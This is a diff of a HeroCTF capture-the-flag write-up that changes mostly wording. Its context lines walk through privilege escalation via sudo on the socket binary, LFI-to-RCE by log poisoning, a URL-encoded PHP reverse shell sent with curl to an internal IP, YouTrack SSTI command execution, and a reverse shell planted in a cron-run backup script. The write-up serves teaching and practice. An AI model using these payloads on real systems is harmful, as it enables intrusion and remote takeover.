@@ -14,7 +14,7 @@ tags: CTF, HeroCTF, System, Enumeration, lateralmovement, CyberSecurity, pentest
 ## Author Note
 
 ```
-Thanks a lot to the HeroCTF team! This was a really nice event! The System category was really fun, i enjoyed a lot!
+Thanks a lot to the HeroCTF team! This was a really nice event! The System category was really cool, i got a lot of fun!
 
 Enjoy while reading my Write-Up!
 
@@ -51,7 +51,7 @@ Credentials: `user:password123`
 
 ### Solution 
 
-After deploying Chm0d instance and connecting to it through ssh with the given credentials, we find the flag and notice that it had no permissions.
+After deploying `Chm0d` instance and connecting to it through ssh with the given credentials, we find the flag and notice that it had no permissions.
 
 ```bash
 user@ca5f7dee1a6bc7eaebc04d9fca2671fc:~$ ls -la /
@@ -67,14 +67,14 @@ drwxr-xr-x   1 root root 4096 May 15 16:57 etc
 ...
 ```
 
-Next step would be to give it read access permission with `chmod`, but here is the problem. It as no execution right...
+Next step would be to give it read access permission with `chmod`, but here is the problem. It as no permissions too...
 
 ```bash
 user@ca5f7dee1a6bc7eaebc04d9fca2671fc:~$ ls -la /bin/chmod                                                                                                                                                                                 
 ---------- 1 root root 64448 Sep 24  2020 /bin/chmod 
 ```
 
-We need to find an alternative way. After do few google search about `chmod` binary alternative. We found that we can use `Perl` with the `chmod` library.
+We need to find an alternative way. After few google search about `chmod` binary alternative. We found that we can use `Perl` with the `chmod` library.
 
 Source :  https://perldoc.perl.org/functions/chmod
 
@@ -92,7 +92,7 @@ perl: warning: Falling back to the standard locale ("C").
 w00t                                                                                                                                                                                                 
 ```
 
-There is some local setting warning, but we can use it.
+There is some local setting warning, but thats not a problem, we can use it.
 
 Now give the read access permission to the `flag.txt` file and read its content.
 
@@ -139,7 +139,7 @@ Credentials: `user:password123`
 
 As said the description, the title hint the right direction : ```sudo -l```
 
-Once the challege deployed, and accessed through ssh with the given credentials, we run the ```sudo -l``` command.
+Once the challenge deployed, and accessed through ssh with the given credentials (`user:password123`), we run the ```sudo -l``` command.
 
 ```bash
 user@sudoklu:~$ sudo -l
@@ -154,7 +154,7 @@ User user may run the following commands on sudoklu:
 
 We notice that we can use the ```socket``` binary with ```sudo``` as ```privilegeduser```.
 
-A quick look to ```GTFObins```, and we found how to abuse the `socket` binary to performe privilege escalation.
+A quick look at ```GTFObins```, and we found how to abuse the `socket` binary to performe privilege escalation.
 
 Source : https://gtfobins.github.io/#socket
 
@@ -204,7 +204,7 @@ _This message will self-destruct in 5 seconds._
 
 ### Solution
 
-This challenge only give us the SSH credentials of LFM instance and give the flag into the description to begins the LFM challenges collection.
+This challenge only give us the SSH credentials of LFM instance and give the flag in the description to begun the LFM challenges collection.
 
 Flag : **Hero{I_4cc3pt_th3_m1ss10n}**
 
@@ -224,9 +224,9 @@ Tracking bugs can be tidious, if you're not equiped with the right tools of cour
 
 ### Solution
 
-Once the instance started and connected to SSH with the credentials given in the previous challenge description (`bob:password`), we can start our enumeration.
+Once the instance deployed, and connected to SSH with the credentials given in the previous challenge description (`bob:password`), we can start our enumeration.
 
-> Note : This instance start two machine, the SSH credentials work only on one of them. So we already know that we should pivot to the other box at a moment.
+> Note : This instance start two machines, the SSH credentials work only on one of them. So we already know that we should probably pivot to the other box at a moment.
 
 We notice a `welcome.txt` note into bob home directory, read it give us few interesting data.
 
@@ -261,13 +261,13 @@ Dave
 
 Reading it, we know that :
 
-* YouTrack is used as main issue track and run on this machine at port 8080
+* YouTrack is used as main issue tracker, and run on this machine at port 8080
 * Dave and us will use the `dev` account with the credentials `dev:aff6d5527753386eaf09`
 * There is an `admin` account.
-* The development server iwth the codebase is offline.
-* There is a `backup server` which is supposed to backup the main app's code and YouTrack configuration and data, but doesn't at the time.
+* The development server with the codebase is offline.
+* There is a `backup server` which is supposed to backup the main app's code and YouTrack configuration and data, but it doesn't at the time.
 * Only Dave, have an account to access the `backup server`, but he made an utility to look the `backup server` log using the command `curl backup`.
-*  The first backups might be messed up with different size than the others. This occured while Dave was setting up YouTrack administration account. So maybe Dave make misstake with this :)
+* The first backups might be messed up with different size than the others. This occured while Dave was setting up YouTrack administration account. So maybe Dave make misstake with this :)
 
 As there is other box, let's read the `/etc/hosts` file first.
 
@@ -344,6 +344,8 @@ Dev machine : 10.99.227.3
 Backup machine : 10.99.227.2
 ```
 
+> Note : While writing this writeup, i was needed to start a lot of instance. And because of this the ip address may change. Just keep in mind that the dev machine is x.x.x.3 and backup machine is x.x.x.2.
+
 Now, there should be a YouTrack instance running on the localhost at port 8080, let's use curl to be sure that something is running.
 
 ```bash
@@ -360,7 +362,7 @@ bob@dev:~$ curl http://127.0.0.1:8080/
 
 As expected, we can see the YouTrack instance, now let's portforward the port 8080 using SSH, this will allow us to access it from our localhost.
 
-> Note : You should let the SSH window open to keep the portforwarding.
+> Note : You should keep the SSH window open, to keep the portforwarding working.
 
 ```bash
 $ ssh -L 8080:localhost:8080 bob@dyn-02.heroctf.fr -p 13399                                                      
@@ -374,7 +376,7 @@ Now open you'r browser, and access the port 8080 on your localhost.
 http://127.0.0.1:8080/
 ```
 
-We are redirected to a YouTrack Dashboard where we are very limited if we doesnt log in. So let's log in as Dev with the given credentials into `welcome.txt` note (`dev:aff6d5527753386eaf09`).
+We are redirected to a YouTrack Dashboard where we are very limited if we doesnt log in. So let's log in as Dev with the credentials given into `welcome.txt` note (`dev:aff6d5527753386eaf09`).
 
 ![1-LoginYouTrackDev](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/3d896c70-16bb-45b2-8d20-e9611f8e8692)
 
@@ -412,7 +414,7 @@ Historically considered as a woman's weapon, pretty sure that's not true and any
 
 Let's come back to our YouTrack issues.
 
-The first one is a glitches where the username is out of the screen when opening the burger menu on smartphone. Not useful.
+The first one is a glitches, where the username is out of the screen when opening the burger menu on smartphone. Not useful.
 
 The second said that there is an RCE in the app, and it give the URL location of the RCE. But if you highligh the link, you notice that it redirect to YouTube! Have a nice Rick Roll!
 
@@ -423,13 +425,13 @@ The third is a lot interesting. The admin is asking for an utility to access bac
 
 ![5-Backup_tool](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/16c77c52-27ae-4880-a84b-cd2f940f27a1)
 
-We can see the code as attachment and the `dev` acount answer that he push the code. 
+We can see the code called ```log_checker.php``` as attachment and the `dev` acount answer that he push the code. 
 
 Download the code for later, and let's examine the last issue.
 
 ![6-wedontcaredude](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/adad51d4-46cd-421a-b6b9-ac409f1512cc)
 
-Not useful, let's come back to our previous download code called ```log_checker.php```.
+Not useful, let's come back to our previous downloaded code called ```log_checker.php```.
 
 ```php
 <?php
@@ -445,7 +447,7 @@ Not useful, let's come back to our previous download code called ```log_checker.
 ?>
 ```
 
-So this code will look if you provided a file and if you provided one, it will return its content, else it will return the content of ```/var/log/backup.log```.
+So this code will look if you provided a file, and if you provided one, it will return its content, else it will return the content of ```/var/log/backup.log```.
 
 Great, so we got a LFI vulnerability here, and apparently it's the code used when we use the command ```curl backup```.
 
@@ -492,7 +494,7 @@ May 15 20:27:01 backup CRON[83]: pam_env(cron:session): Unable to open env file:
 
 Great! We can read the SSH logs of the backup machine! Let's look if the log will show our SSH connection attempt to the backup machine.  
 
-> Note : From you'r Kali, try a SSH connection on the second machine, you should look at the port on the deployed instance (not the machine where you connected as bob). Or from bob on the dev machine, you can SSH directly on backup port 22.
+> Note : From you'r Kali, try a SSH connection on the second machine, you should look at the port on the deployed instance. Or from bob on the dev machine, you can SSH directly on backup port 22.
 
 
 ```bash
@@ -598,13 +600,13 @@ Source : https://meyerweb.com/eric/tools/dencoder/
 php%20-r%20%27%24sock%3Dfsockopen(%2210.99.236.3%22%2C1234)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
 ```
 
-Go back to to both SSH instance, be sure that you'r netcat instance is running on port same port as you'r payload, and execute the RCE from the LFI to get a shell.
+Go back to to both SSH instance, be sure that you'r netcat instance is running on the same port as you'r payload, and execute the RCE from the LFI to get a shell.
 
 ```bash
 bob@dev:~$ curl "http://backup/?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.99.236.3%22%2C1234)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27"
 ```
 
-And we got a shell on backup machine!
+And we got a shell as `www-data` on backup machine!
 
 ![7-Shell_Backup](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/39e30cdf-ba11-479a-9aff-2c51a96eb42c)
 
@@ -671,7 +673,7 @@ I already looked there didn't I ?
 
 As we can understand, from the description, we need to come back to YouTrack. And as we understand, with the title we need to login as admin.
 
-> Note : Of course, at the first time of login as "dev" on YouTrack, you should already have tried to login as admin with those generic password. In fact, you already know that the username is admin, but the password isn't. 
+> Note : Of course, at the first time of login as "dev" on YouTrack, you should already have tried to login as admin with those generic passwords. In fact, you already know that the username is admin, but the password isn't. 
 
 So let's look in our backup. As we remember the `welcome.txt` note, Dave has done some settings change on YouTrack, and the backup files shouldn't be all the same.
 
@@ -709,7 +711,7 @@ drwxr-xr-x 1 root   root     4096 May 15 22:31 ..
 -rw-rw-r-- 1 dave   dave   879795 May 15 22:54 youtrack-1684191241.zip
 ```
 
-By looking at the size and date, we notice that a lot of backup should be the same. Excepted the two first.
+By looking at the size and date, we notice that a lot of backups should be the same. Excepted the two first.
 
 The first backup had a lower size and was created the 12 May. The second backup had a bigger size than the first, but a lower size than each others, but it was created at the same time. Then each backup was created at the same time with one second of interval and get the same size.
 
@@ -750,17 +752,17 @@ Let's Google if our Jetbrains YouTrack instance is vulnerable to something. You 
 
 ![13-YouTrack_Version](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/d7ecf937-1f76-4cd4-8c06-25eccdc3c772)
 
-After a quick google search `YouTrack Exploit`, we find this blog post about how to exploit `CVE-2021-25770` which is a Server Side Template Injection vulnerability on YouTrack.
+After a quick google search `YouTrack 2020.5.2579 Exploit`, we find this blog post about how to exploit `CVE-2021-25770` which is a Server Side Template Injection vulnerability on YouTrack.
 
 Source : https://www.synacktiv.com/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html
 
-> Note : Follow the blog post, it is really well detailled.
+> Note : Follow the blog post, it is really well detailled.And follow the given links to learn more about the sandbox bypass used.
 
-First, we will test if the SSTI vulnerability is not patched. For it, firs load one of the existing notification template.
+First, we will test if the SSTI vulnerability is not patched. For it, we load one of the existing notification template.
 
 ![14-Load_Notification](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/dea41fc1-a975-4c80-8f59-62a763cbafd5)
 
-Now let's try to do the classic calcul `7*7` and let's see if the console return us the result.
+Remove the existing content and try to do the classic calcul `7*7` and let's see if the console return us the result.
 
 ![15-SSTI](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/838f41e1-e2ba-4460-b7c7-dbc33be17a46)
 
@@ -776,7 +778,9 @@ ${dwf.newInstance(ec,null)("id")}
 
 ![16-Exploit_SSTI](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/6d804f4e-9ad9-4328-a873-1a3cf9cbe49b)
 
-Now repeat the process to enumerate the machine. We start to list the files in the Dave home directory.
+Great, our command execution seem working. But we seem a bit limited, we are not able to get a reverse shell. As exemple, echoing a strings to file doesn't work, it will output the result like you echoing the whole command. Reverse shell such as PHP, nc, python, bash doesn't work. Trying to read ssh keys of dave doesnt work. And a lot of other things.
+
+So now repeat the process to enumerate the machine. We start to list the files in the Dave home directory.
 
 ```bash
 ${dwf.newInstance(ec,null)("ls /home/dave/")}
@@ -807,11 +811,11 @@ One more step to go!
 
 ### Solution
 
-Once the Dave user home directory, we found the previous flag but we seen also a file called `randomfile.txt.enc`.
+Once the content of Dave user home directory listed, we found the previous flag, but we also seen a file called `randomfile.txt.enc`.
 
 ![21-encoded_file](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/47a5fa74-540c-430c-8b73-a2994d975ca5)
 
-As we remember our initial goal, Dave is selling customer information and we need to get proof of that. As this is the final challenge, this encrypted file should be our proof.
+As we remember our initial goal, Dave is selling customers informations and we need to get proof of that. As this is the final challenge, this encrypted file should be our proof.
 
 We need to know which algorythm was used to encrypt the data and also if a password was used.
 
@@ -827,7 +831,7 @@ dave@$vps:~/toSendToBuyer.txt openssl aes-256-cbc -salt -k Sup3r53cr3tP4ssw0rd -
 
 Great! As the path said, our guess was correct, those encrypted data are our proof. We know that the algorythm used is `aes-256-cb` and he used a key `Sup3r53cr3tP4ssw0rd`.
 
-Now let's decrypt the content.
+Now let's decrypt the file.
 
 ```
 $ openssl aes-256-cbc -d -salt -k Sup3r53cr3tP4ssw0rd -in /home/dave/randomfile.txt.enc -out /home/dave/randomfile.txt
@@ -872,7 +876,7 @@ Note :
 ```
 I tried a lot of things to get a shell back as Dave. Nothing worked.
 
-Before stopping my research, i've contacted Log_s to ask hime, if there is any way to get a shell as Dave. And the answer is YES!
+Before stopping my research, i've contacted Log_s to ask him if there is any way to get a shell as Dave. And the answer is YES!
 
 As you can see bellow in french, he told me that he made a misstake while patching another box. Dave keep executing the backup script, and the backup user is allowed to write in it. So simply put a payload in it should give us a shell as Dave.
 
@@ -883,9 +887,9 @@ Of course, this mean you can bypass the challenge 3 and 4.
 
 ### Solution
 
-Now let's see how to achieve this.  Come back ton a "backup" user terminal (after using the LFI/RCE to get a www-data shell and escalate to backup using rsync).
+Now let's see how to achieve this.  Come back to "backup" user terminal (after using the LFI/RCE to get a www-data shell and escalate to backup using rsync).
 
-First we will use `Pspy` utility to inspect when and how the backup file is executed.
+First we will use `Pspy` utility to inspect, when and how the backup file is executed.
 
 To do it we download `pspy` directly on the machine as we have internet access.
 
@@ -905,7 +909,7 @@ Now keep looking at the output and wait a bit.
 
 ![1-cron](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/e85cc384-4cc0-46aa-9ab6-f3bc065ea376)
 
-Perfect, we can see that the user with id "1000" run the command `/bin/sh /bin/backup.sh`. So this should be Dave executing the backup utility.
+Perfect, we can see that the user with id "1000" running the command `/bin/sh /bin/backup.sh`. So this should be Dave executing the backup utility.
 
 Next, let's look at the utility permissions.
 
@@ -915,7 +919,7 @@ ls -la backup.sh
 -rwxr-xr-x 1 backup backup 760 May 12 10:17 backup.sh
 ```
 
-As Log_s say, we are allowed to write in it!
+As Log_s say, we are owner of it which mean we can modify it!
 
 Now let's look our ip address through `/etc/hosts` and then use `vim`, to write a php payload in it.
 
@@ -929,7 +933,12 @@ ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 172.30.0.2      backup
+
+backup@backup:/backup$ vim /backup/backup.sh
 ```
+> Note : Once pressed `ESC`+`i`, i've inserted my php payload from pentest monkey as first line. You can see it in the next screenshot.
+
+Source : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 Open a listener and keep waiting. You can get another instance open to look at pspy and instantly look the process.
 
@@ -1005,6 +1014,8 @@ dave@dev:~$
 ```
 
 ![3-Exploit_proof](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/2c3210a4-df1f-40ed-ab04-aaa2db29b923)
+
+We got a save point :P
 
 **Thanks for reading!**
 
